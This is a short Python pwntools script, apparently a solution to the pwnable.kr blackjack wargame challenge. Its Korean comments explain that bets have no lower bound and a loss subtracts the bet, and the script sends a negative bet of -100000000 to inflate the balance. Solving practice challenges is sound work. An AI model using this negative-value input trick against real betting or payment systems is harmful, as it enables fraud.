from pwn import *

r = remote('pwnable.kr', 9009)

# first screen
r.recv()
r.sendline("Y")

# select game start
r.recv()
r.sendline("1")

# 베팅의 하한선을 두지 않았고,
# 지게되면 베팅 값만큼 빼주기 때문에
# 음수로 배팅해서 질 경우 오히려 금액이 늘게 된다.
print(r.recv())
r.sendline("-100000000")
r.sendline("S")
r.sendline("Y")

r.interactive()